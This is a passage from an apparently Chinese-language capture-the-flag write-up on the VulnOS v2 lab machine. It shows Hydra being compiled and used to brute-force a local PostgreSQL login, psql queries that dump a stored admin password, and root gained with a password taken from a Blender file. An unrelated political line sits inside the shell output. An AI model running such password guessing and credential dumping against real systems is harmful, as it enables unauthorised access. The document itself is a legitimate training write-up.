gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-svn.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-pcanywhere.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-sip.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-oracle-sid.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-oracle.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-vmauthd.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-asterisk.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-firebird.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-afp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-ncp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-http-proxy.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-http-form.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-irc.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-redis.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-rdp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c crc32.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c d3des.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c bfg.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c ntlm.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c sasl.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hmacmd5.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-mod.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -lm    -o hydra  hydra.c hydra-vnc.o hydra-pcnfs.o hydra-rexec.o hydra-nntp.o hydra-socks5.o hydra-telnet.o hydra-cisco.o hydra-http.o hydra-ftp.o hydra-imap.o hydra-pop3.o hydra-smb.o hydra-icq.o hydra-cisco-enable.o hydra-ldap.o hydra-mysql.o hydra-mssql.o hydra-xmpp.o hydra-http-proxy-urlenum.o hydra-snmp.o hydra-cvs.o hydra-smtp.o hydra-smtp-enum.o hydra-sapr3.o hydra-ssh.o hydra-sshkey.o hydra-teamspeak.o hydra-postgres.o hydra-rsh.o hydra-rlogin.o hydra-oracle-listener.o hydra-svn.o hydra-pcanywhere.o hydra-sip.o hydra-oracle-sid.o hydra-oracle.o hydra-vmauthd.o hydra-asterisk.o hydra-firebird.o hydra-afp.o hydra-ncp.o hydra-http-proxy.o hydra-http-form.o hydra-irc.o hydra-redis.o hydra-rdp.o hydra-s7-300.c crc32.o d3des.o bfg.o ntlm.o sasl.o hmacmd5.o hydra-mod.o -lm -lssl -lidn -lpq -lcrypto -L/usr/lib -L/usr/local/lib -L/lib -L/lib/i386-linux-gnu -L/usr/lib  -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H

If men could get pregnant, abortion would be a sacrament


Now type make install
webmin@VulnOSv2:~/post$ make install

Now type make install
strip hydra pw-inspector
echo OK > /dev/null && test -x xhydra && strip xhydra || echo OK > /dev/null
mkdir -p /usr/local/bin
cp -f hydra-wizard.sh hydra pw-inspector /usr/local/bin && cd /usr/local/bin && chmod 755 hydra-wizard.sh hydra pw-inspector
cp: cannot create regular file ‘/usr/local/bin/hydra-wizard.sh’: Permission denied
cp: cannot create regular file ‘/usr/local/bin/hydra’: Permission denied
cp: cannot create regular file ‘/usr/local/bin/pw-inspector’: Permission denied
make: *** [install] Error 1
webmin@VulnOSv2:~/post$ ./hydra -h
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
  -w / -W TIME  waittime for responses (32s) / between connects per thread
  -4 / -6   prefer IPv4 (default) or IPv6 addresses
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
  -q        do not print messages about connection erros
  -U        service module usage details
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at http://www.thc.org/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.
These services were not compiled in: sapr3 firebird afp ncp ssh sshkey svn oracle mysql5 and regex support.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY - and if needed HYDRA_PROXY_AUTH - environment for a proxy setup.
E.g.:  % export HYDRA_PROXY=socks5://127.0.0.1:9150 (or socks4:// or connect://)
       % export HYDRA_PROXY_HTTP=http://proxy:8080
       % export HYDRA_PROXY_AUTH=user:pass

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
webmin@VulnOSv2:~/post$ hydra -l postgres -e nsr postgres://localhost:5432
The program 'hydra' is currently not installed. To run 'hydra' please ask your administrator to install the package 'hydra'
webmin@VulnOSv2:~/post$ ./hydra -l postgres -e nsr postgres://localhost:5432
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-07-31 02:01:42
[DATA] max 3 tasks per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
[DATA] attacking service postgres on port 5432
[5432][postgres] host: localhost   login: postgres   password: postgres
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-07-31 02:01:43
webmin@VulnOSv2:~/post$ ./hydra -l root -e nsr mysql://localhost:3306
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-07-31 02:02:29
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 3 tasks per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
[DATA] attacking service mysql on port 3306
[STATUS] attack finished for localhost (waiting for children to finish) ...
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-07-31 02:02:30
webmin@VulnOSv2:~$ psql -h localhost -U postgres
Password for user postgres:
psql (9.3.11)
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
Type "help" for help.

postgres=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 system    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =CTc/postgres        +
           |          |          |             |             | postgres=CTc/postgres
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)
postgres=# \c postgres
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
You are now connected to database "postgres" as user "postgres".
postgres=# \dt
No relations found.
postgres=# \c system
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
You are now connected to database "system" as user "postgres".
system=# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | users | table | postgres
(1 row)
system=# select * from users;
 ID |  username   |    password
----+-------------+-----------------
  1 | vulnosadmin | c4nuh4ckm3tw1c3
(1 row)
system=# \c template0
FATAL:  database "template0" is not currently accepting connections
Previous connection kept
system=# \c template1
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
You are now connected to database "template1" as user "postgres".
template1=# \dt
No relations found.
```
</details>

## 5.4 通过blender文件获取到root密码



通过hydra破解得到的postgres/postgres,查看system表可以得到第四个账号：vulnosadmin/c4nuh4ckm3tw1c3
```shell
webmin@VulnOSv2:~$ su vulnosadmin
Password:c4nuh4ckm3tw1c3
vulnosadmin@VulnOSv2:/home/webmin$
vulnosadmin@VulnOSv2:~$ ls -al
total 476
drwxr-x--- 3 vulnosadmin vulnosadmin   4096 May  4  2016 .
drwxr-xr-x 4 root        root          4096 Apr 16  2016 ..
-rw------- 1 vulnosadmin vulnosadmin   4817 May  4  2016 .bash_history
-rw-r--r-- 1 vulnosadmin vulnosadmin    220 Apr  3  2016 .bash_logout
-rw-r--r-- 1 vulnosadmin vulnosadmin   3637 Apr  3  2016 .bashrc
drwx------ 2 vulnosadmin vulnosadmin   4096 Apr  3  2016 .cache
-rw-r--r-- 1 vulnosadmin vulnosadmin    675 Apr  3  2016 .profile
-rw-rw-r-- 1 vulnosadmin vulnosadmin 449100 May  4  2016 r00t.blend
-rw------- 1 root        root          1504 May  2  2016 .viminfo
vulnosadmin@VulnOSv2:~$ file r00t.blend
r00t.blend: Blender3D, saved as 32-bits little endian with version 2.77
```
<p>使用blender打开这个文件，会发现神奇的事情：</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/11.png" width="56%" ></br>
得到一个字符串：ab12fg//drg

猜测是root密码：
```shell
vulnosadmin@VulnOSv2:~$ su root
Password:
root@VulnOSv2:/home/vulnosadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@VulnOSv2:/home/vulnosadmin#
```

# 6. Conclusion
还是说明一下，由于是用自己的电脑搭建的虚拟机环境，因此大多数的时候虚拟机的IP地址过一定时间就会变，这个很正常，在文档中看到前后IP不一致也不要奇怪，属于正常现象。